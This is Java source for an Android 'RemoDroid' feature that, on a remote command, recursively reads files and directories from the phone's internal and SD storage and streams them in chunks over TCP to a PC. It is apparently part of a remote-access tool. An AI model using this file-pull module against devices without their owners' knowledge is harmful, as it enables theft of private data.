package com.remo.features;

import android.util.Log;
import com.remo.connections.DataHandler;
import com.remo.connections.Feature;

import java.io.*;

public class FileDownloader extends Feature {

    public FileDownloader() {
        UseMainConnection = false;
        Feature_type = DataHandler.eDataType.FM_DOWN.ordinal();

    }


    @Override
    public void AsyncTaskFunc(String Params) {
    }


    @Override
    public void update(String Params) {

        File f = new File(toMob(Params));
        if(f.exists()) {
            sendPacket(Flages.DOWNLOAD_OBJ_START.ordinal(), "_".getBytes());

             if(f.isFile()) {
                Log.d("REMODROID","FileDown Type : File , Path : " + toMob(Params));
                sendFile(toMob(Params), 512000);

            }
            else if(f.isDirectory()) {
                 Log.d("REMODROID","FileDown Type : Dir , Path : " + toMob(Params));
                sendDir(toMob(Params));

            }
            sendPacket(Flages.DOWNLOAD_OBJ_FINISHED.ordinal(), "_".getBytes());
        }else {
            Log.e("REMODROID","FileDown Ex Not Exist " + toMob(Params));
        }
    }


    private void sendFile(String FilePath,int chunkSize) {
        try {
            File file = new File(FilePath);
        sendPacket(Flages.FILE_START.ordinal(), file.getName().getBytes("UTF-8"));
        int offset = 0;
        byte[] bytes;
        if (file.length() == 0) {
            sendPacket(Flages.FILE_FINISHED.ordinal(), file.getName().getBytes("UTF-8"));
        }
        else {

            long count_of_full_parts = file.length() / chunkSize;
            long mod = file.length() % chunkSize;
            for (int i = 0; i < count_of_full_parts; i++) {
                if(stopFlag || tcp.tcpStopFlag)
                    break;
                bytes = new byte[chunkSize];
                offset = i * chunkSize;
                //file.seek(0);
               // Log.d("REMODROID", "Offset : " + offset);
               // Log.d("REMODROID", "offset + bytes.length : " + ((int) (offset + chunkSize)));

                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.skip(offset);
                int x = buf.read(bytes, 0, bytes.length);
                sendPacket(Flages.FILE_PACKET.ordinal(), bytes);
                buf.close();
            }
            if(count_of_full_parts>0)
                offset += chunkSize;
            bytes = new byte[(int) mod];

            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.skip(offset);
            int x = buf.read(bytes, 0, bytes.length);
            sendPacket(Flages.FILE_PACKET.ordinal(), bytes);
            buf.close();


            sendPacket(Flages.FILE_FINISHED.ordinal(), file.getName().getBytes("UTF-8"));

        }
        } catch (Exception e) {
            Log.e("REMODROID","File Ex : "+ e.getMessage());
        }
    }

//    private void sendDir(String dirPath){
//        File file = new File(dirPath);
//        try {
//            sendPacket(Flages.CD.ordinal(), dirPath.getBytes("UTF-8"));
//
//
//
//
//
//
//
//        } catch (UnsupportedEncodingException e) {
//            Log.e("REMODROID","Dir Ex : "+ e.getMessage());
//        }
//    }

    private void sendDir(String root) {
        try {
        File file = new File(root);
        sendPacket(Flages.CD.ordinal(), toPC(file.getAbsolutePath()).getBytes("UTF-8"));
        File[] list = file.listFiles();

        for (File f : list) {
            if (f.isDirectory()) {
                    sendPacket(Flages.CD.ordinal(), toPC(file.getAbsolutePath()).getBytes("UTF-8"));
                    sendDir(f.getAbsolutePath());
            }
            else {
              //  Log.d("", "File: " + f.getAbsoluteFile());
                sendFile(f.getAbsolutePath(),500 * 1024);
            }
        }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String toMob(String path) {
        return path
                .replace("Internal", System.getenv("EXTERNAL_STORAGE"))
                .replace("SDCard", System.getenv("SECONDARY_STORAGE"));
    }

    private String toPC(String path){
        return path
                .replace(System.getenv("EXTERNAL_STORAGE"),"Internal")
                .replace(System.getenv("SECONDARY_STORAGE"),"SDCard");
    }



    private enum Flages
    {
        DOWNLOAD_OBJ_START,
        FILE_START,
        FILE_PACKET,
        FILE_FINISHED,
        DOWNLOAD_OBJ_FINISHED,
        CD

    }


}
